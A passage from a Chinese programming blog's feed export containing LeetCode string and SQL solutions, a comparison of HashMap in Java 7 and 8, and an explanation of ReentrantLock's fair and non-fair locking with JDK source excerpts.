<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">String <span class="title">removeVowels</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		Set&lt;Character&gt; vowels = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		vowels.add(<span class="string">'a'</span>);</span><br><span class="line">		vowels.add(<span class="string">'e'</span>);</span><br><span class="line">		vowels.add(<span class="string">'i'</span>);</span><br><span class="line">		vowels.add(<span class="string">'o'</span>);</span><br><span class="line">		vowels.add(<span class="string">'u'</span>);</span><br><span class="line">		</span><br><span class="line">		StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (vowels.contains(c)) &#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			stringBuilder.append(c);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">remVowels</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels = &#123;<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>&#125;;</span><br><span class="line">        <span class="built_in">string</span> result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(vowels.<span class="built_in">begin</span>(), vowels.<span class="built_in">end</span>(), str[i]) == vowels.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                result += str.at(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Strings</tag>
      </tags>
  </entry>
  <entry>
    <title>1350. Students With Invalid Departments</title>
    <url>/2020/03/18/LeetCode/leetcode-001350.%20Students%20With%20Invalid%20Departments/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>Table: Departments</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">id is the primary key of this table.</span><br><span class="line">The table has information about the id of each department of a university.</span><br></pre></td></tr></table></figure>

<p><strong>Table: Students</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| unique_id     | int     |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">(id, unique_id) is the primary key for this table.</span><br><span class="line">Each row of this table contains the id and the corresponding unique id of an employee in the company.</span><br></pre></td></tr></table></figure>

<p>Write an SQL query to find the id and the name of all students who are enrolled in departments that no longer exists.</p>
<p>Return the result table in any order.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Departments table:</span><br><span class="line">+------+--------------------------+</span><br><span class="line">| id   | name                     |</span><br><span class="line">+------+--------------------------+</span><br><span class="line">| 1    | Electrical Engineering   |</span><br><span class="line">| 7    | Computer Engineering     |</span><br><span class="line">| 13   | Bussiness Administration |</span><br><span class="line">+------+--------------------------+</span><br><span class="line"></span><br><span class="line">Students table:</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| id   | name     | department_id |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| 23   | Alice    | 1             |</span><br><span class="line">| 1    | Bob      | 7             |</span><br><span class="line">| 5    | Jennifer | 13            |</span><br><span class="line">| 2    | John     | 14            |</span><br><span class="line">| 4    | Jasmine  | 77            |</span><br><span class="line">| 3    | Steve    | 74            |</span><br><span class="line">| 6    | Luis     | 1             |</span><br><span class="line">| 8    | Jonathan | 7             |</span><br><span class="line">| 7    | Daiana   | 33            |</span><br><span class="line">| 11   | Madelynn | 1             |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line"></span><br><span class="line">Result table:</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | name     |</span><br><span class="line">+------+----------+</span><br><span class="line">| 2    | John     |</span><br><span class="line">| 7    | Daiana   |</span><br><span class="line">| 4    | Jasmine  |</span><br><span class="line">| 3    | Steve    |</span><br><span class="line">+------+----------+</span><br><span class="line"></span><br><span class="line">John, Daiana, Steve and Jasmine are enrolled in departments 14, 33, 74 and 77 respectively. department 14, 33, 74 and 77 doesn&#39;t exist in the Departments table.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>题目大意就是找过所有没有注册过公寓的学生。即该学生的公寓不在给定的公寓中。</p>
<p>用子查询</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select id, <span class="function">name from Students where department_id not <span class="title">in</span> <span class="params">(select id from Departments)</span></span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1378. Replace Employee ID With The Unique Identifier</title>
    <url>/2020/03/18/LeetCode/leetcode-001378.%20Replace%20Employee%20ID%20With%20The%20Unique%20Identifier/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>Table: Employees</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">id is the primary key for this table.</span><br><span class="line">Each row of this table contains the id and the name of an employee in a company.</span><br></pre></td></tr></table></figure>

<p><strong>Table: EmployeeUNI</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">| id            | int     |</span><br><span class="line">| unique_id     | int     |</span><br><span class="line">+<span class="comment">---------------+---------+</span></span><br><span class="line">(id, unique_id) is the primary key for this table.</span><br><span class="line">Each row of this table contains the id and the corresponding unique id of an employee in the company.</span><br></pre></td></tr></table></figure>

<p>Write an SQL query to show the unique ID of each user, If a user doesn’t have a unique ID replace just show null.</p>
<p>Return the result table in any order.</p>
<p>The query result format is in the following example:</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Employees table:</span><br><span class="line">+----+----------+</span><br><span class="line">| id | name     |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Alice    |</span><br><span class="line">| 7  | Bob      |</span><br><span class="line">| 11 | Meir     |</span><br><span class="line">| 90 | Winston  |</span><br><span class="line">| 3  | Jonathan |</span><br><span class="line">+----+----------+</span><br><span class="line"></span><br><span class="line">EmployeeUNI table:</span><br><span class="line">+----+-----------+</span><br><span class="line">| id | unique_id |</span><br><span class="line">+----+-----------+</span><br><span class="line">| 3  | 1         |</span><br><span class="line">| 11 | 2         |</span><br><span class="line">| 90 | 3         |</span><br><span class="line">+----+-----------+</span><br><span class="line"></span><br><span class="line">EmployeeUNI table:</span><br><span class="line">+-----------+----------+</span><br><span class="line">| unique_id | name     |</span><br><span class="line">+-----------+----------+</span><br><span class="line">| null      | Alice    |</span><br><span class="line">| null      | Bob      |</span><br><span class="line">| 2         | Meir     |</span><br><span class="line">| 3         | Winston  |</span><br><span class="line">| 1         | Jonathan |</span><br><span class="line">+-----------+----------+</span><br><span class="line"></span><br><span class="line">Alice and Bob don&#39;t have a unique ID, We will show null instead.</span><br><span class="line">The unique ID of Meir is 2.</span><br><span class="line">The unique ID of Winston is 3.</span><br><span class="line">The unique ID of Jonathan is 1.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>左连接就会以左表Employee为准，将id相同的unique_id  select 出来，如果在EmployeeUNI表中没有id对应的unique_id则返回null。</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select unique_id, name from Employees left join EmployeeUNI on Employees.id = EmployeeUNI.id</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>HashMap在Java7和8中的区别</title>
    <url>/2020/03/18/Java/Java%E5%9F%BA%E7%A1%80/2020-03-18-HashMap%E5%9C%A8Java7%E5%92%8CJava8%E4%B8%AD%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="HashMap解析"><a href="#HashMap解析" class="headerlink" title="HashMap解析"></a>HashMap解析</h1><p>本文不会对HashMap的源码或者原理什么的进行分析，就针对Java7/8中HashMap的不同之处进行分析。</p>
<h2 id="Java-7中的HashMap"><a href="#Java-7中的HashMap" class="headerlink" title="Java 7中的HashMap"></a>Java 7中的HashMap</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>HashMap在Java7中的底层结构为Entry对象。它的具体定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">        <span class="keyword">int</span> hash;<span class="comment">//对key的hashcode值进行hash运算后得到的值，存储在Entry，避免重复计算</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Creates new entry.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Entry(<span class="keyword">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">            value = v;</span><br><span class="line">            next = n;</span><br><span class="line">            key = k;</span><br><span class="line">            hash = h;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>具体的数据结构如下：</p>
<p><img src="https://huhansi.github.io/images/20200320-java7-hashmap.png" alt="Java 7中的HashMap"></p>
<p>在Java7中，当成百上千个节点在hash时发生碰撞，这些节点都会存储在一个链表中。如果要查找这个链表中的某一个节点，就要花费O(N)的查找时间。</p>
<h3 id="发生冲突时"><a href="#发生冲突时" class="headerlink" title="发生冲突时"></a>发生冲突时</h3><p>在Java 7 中发生冲突的时候，会将新的冲突节点插入到对应链表的头节点位置。这样就会在多线程情况下存在一个死循环的问题。因为，在扩容的时候，原先的链表会逆序将节点插入到新HashMap的链表中去，这种情况下就存在节点循环引用的可能。最后导致get的时候，死循环。</p>
<h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>在扩容resize过程中，采用单链表的头插入方式，在将旧数组上的数据 转移到 新数组上时，转移操作 = 按旧链表的正序遍历链表、在新链表的头部依次插入，即在转移数据、扩容后，容易出现链表逆序的情况 。 多线程下resize()容易出现死循环。此时若（多线程）并发执行 put（）操作，一旦出现扩容情况，则 容易出现 环形链表，从而在获取数据、遍历链表时 形成死循环（Infinite Loop），即 死锁的状态 。</p>
<h2 id="Java-8中的HashMap"><a href="#Java-8中的HashMap" class="headerlink" title="Java 8中的HashMap"></a>Java 8中的HashMap</h2><h3 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h3><p>HashMap在Java 8中使用了和ConcurrentHashMap一样的Node节点作为底层存贮的数据结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = hash;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">"="</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">            V oldValue = value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/20200320-java8-hashmap.png" alt="Java 8中的HashMap"></p>
<h3 id="发生冲突时-1"><a href="#发生冲突时-1" class="headerlink" title="发生冲突时"></a>发生冲突时</h3><p>发生hash冲突后，会优先判断该节点的数据结构式是红黑树还是链表，如果是红黑树，则在红黑树中插入数据；如果是链表，则将数据插入到链表的尾部并判断链表长度是否大于8，如果大于8要转成红黑树。</p>
<h3 id="扩容-1"><a href="#扩容-1" class="headerlink" title="扩容"></a>扩容</h3><p>由于 JDK 1.8 转移数据操作 = 按旧链表的正序遍历链表、在新链表的尾部依次插入，所以不会出现链表 逆序、倒置的情况，故不容易出现环形链表的情况 ，但jdk1.8仍是线程不安全的，因为没有加同步锁保护。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>ReentrantLock解析</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-10-%E5%A4%9A%E7%BA%BF%E7%A8%8B-03-ReentrantLock%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ReentrantLock解析"><a href="#ReentrantLock解析" class="headerlink" title="ReentrantLock解析"></a>ReentrantLock解析</h1><p>ReentrantLock是Java.util.concurrent包中提供的锁。是Lock接口的默认实现，排他锁（独享锁），相对于Synchronized而言，ReentrantLock提供了更细粒度的加锁方式以及更多的操作方式。</p>
<h2 id="ReentrantLock特点"><a href="#ReentrantLock特点" class="headerlink" title="ReentrantLock特点"></a>ReentrantLock特点</h2><ul>
<li>可重入；</li>
<li>可中断</li>
<li>分为公平锁和非公平锁，默认为非公平锁</li>
</ul>
<p>它的使用方式为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">lock.lock();</span><br><span class="line">		</span><br><span class="line"><span class="comment">// do busniess</span></span><br><span class="line"></span><br><span class="line">lock.unlock();</span><br></pre></td></tr></table></figure>

<p>可以在new的时候指定使用公平锁还是非公平锁。</p>
<p>默认的构造方法，ReentrantLock()创建的是非公平锁。调用ReentrantLock(bool fair)这个构造方法，传入true，既可以创建一个公平的ReentrantLock锁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates an instance of &#123;<span class="doctag">@code</span> ReentrantLock&#125;.</span></span><br><span class="line"><span class="comment">     * This is equivalent to using &#123;<span class="doctag">@code</span> ReentrantLock(false)&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync = <span class="keyword">new</span> NonfairSync();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates an instance of &#123;<span class="doctag">@code</span> ReentrantLock&#125; with the</span></span><br><span class="line"><span class="comment">     * given fairness policy.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fair &#123;<span class="doctag">@code</span> true&#125; if this lock should use a fair ordering policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">(<span class="keyword">boolean</span> fair)</span> </span>&#123;</span><br><span class="line">        sync = fair ? <span class="keyword">new</span> FairSync() : <span class="keyword">new</span> NonfairSync();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ReentrantLock类结构"><a href="#ReentrantLock类结构" class="headerlink" title="ReentrantLock类结构"></a>ReentrantLock类结构</h2><p>参见下图，简单梳理了以下，ReentrantLock的类结构图</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-ReentrantLock.png" alt="ReentrantLock类结构"></p>
<ul>
<li>ReentrantLock实现了Lock，Serializable接口</li>
<li>内部使用了内部类Sync来实现主要的加锁、解锁逻辑</li>
<li>通过继承了Sync类的NonFairSync和FairSync实现了非公平锁和公平锁的逻辑</li>
<li>Sync内部类继承了AQS</li>
</ul>
<p>AQS相关内容可参见<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-04.Java-AQS-解析/">Java AQS 解析</a></p>
<h2 id="ReentrantLock加-解锁流程分析"><a href="#ReentrantLock加-解锁流程分析" class="headerlink" title="ReentrantLock加/解锁流程分析"></a>ReentrantLock加/解锁流程分析</h2><h3 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.lock();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，代码就是简简单单一句sync.lock().而这块的sync，根据创建的不同选择，可以是公平锁和非公平锁。那么接下来再看看公平锁和非公平锁是怎么处理这块逻辑的。</p>
<h4 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">FairSync</span> <span class="keyword">extends</span> <span class="title">Sync</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3000897897090466540L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            acquire(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它也是简简单单一句acquire(1).追踪进去，发现它是调用的AbstractQueuedSynchronizer类中的acquire方法。具体逻辑请参考文章<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-04.Java-AQS-解析/">Java AQS 解析</a></p>
<p>我们看一看公平锁自己实现的tryAcquire();</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">         * Fair version of tryAcquire.  Don&#39;t grant access unless</span><br><span class="line">         * recursive call or no waiters or is first.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        protected final boolean tryAcquire(int acquires) &#123;</span><br><span class="line">            final Thread current &#x3D; Thread.currentThread();</span><br><span class="line">            int c &#x3D; getState(); </span><br><span class="line">            if (c &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                if (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">                    compareAndSetState(0, acquires)) &#123;</span><br><span class="line">                    setExclusiveOwnerThread(current);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (current &#x3D;&#x3D; getExclusiveOwnerThread()) &#123;</span><br><span class="line">                int nextc &#x3D; c + acquires;</span><br><span class="line">                if (nextc &lt; 0)</span><br><span class="line">                    throw new Error(&quot;Maximum lock count exceeded&quot;);</span><br><span class="line">                setState(nextc);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>它首先获取state的值，如果，state为0，表示当前锁时可用的，然后看看等待队列里面是否还有线程在等着，有就不能尝试获取锁，必须排队；</p>
<p>如果state不为0，则判断当前线程是不是就是已经占用锁的那个独占线程，是的话，修改state，期间还判断下state是否溢出。</p>
<h4 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h4><p>非公平锁流程上和公平锁类似，区别就是：</p>
<ul>
<li><p>lock的时候先直接lock，失败的话，在尝试重新获取</p>
</li>
<li><p>在tryAcquire的时候，没有判断队列中是否有线程在等待这一步，也就是没有这个过程(!hasQueuedPredecessors() ).</p>
</li>
</ul>
<p>看下它的lock方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Performs lock.  Try immediate barge, backing up to normal</span></span><br><span class="line"><span class="comment">         * acquire on failure.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                acquire(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>NonFairSync非公平锁的acquire同FairSync一样，还是调用的弗雷AQS的acquire，这里不做细解。</p>
<p>它在lock的时候，直接通过CAS操作取设置state为1，如果成功了，则抢占锁成功，直接把独占线程设置为自己，否则，再通过AQS的acquire获取锁。</p>
<p>接下来看下NonFairSync的tryAcquire方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nonfairTryAcquire(acquires);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Performs non-fair tryLock.  tryAcquire is implemented in</span></span><br><span class="line"><span class="comment">         * subclasses, but both need nonfair try for trylock method.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">nonfairTryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">int</span> c = getState();</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                    setExclusiveOwnerThread(current);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">                <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">                <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">                setState(nextc);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>从上面的代码可以比较出，它和FairSync同样功能的方法是极其类似的，就是少了一句（!hasQueuedPredecessors() ）。</p>
<h3 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h3><p>ReentrantLock的解锁方法，unlock也是简单的调用了一下Sync的release方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempts to release this lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;If the current thread is the holder of this lock then the hold</span></span><br><span class="line"><span class="comment">     * count is decremented.  If the hold count is now zero then the lock</span></span><br><span class="line"><span class="comment">     * is released.  If the current thread is not the holder of this</span></span><br><span class="line"><span class="comment">     * lock then &#123;<span class="doctag">@link</span> IllegalMonitorStateException&#125; is thrown.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalMonitorStateException if the current thread does not</span></span><br><span class="line"><span class="comment">     *         hold this lock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>解锁在这块就没有公平和非公平之分了，统一调用的是AQS中的release方法。请参考文章<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-12-多线程-04.Java-AQS-解析/">Java AQS 解析</a></p>
<p>而AQS的release方法中则调用了Sync中实现的tryRelease方法。</p>
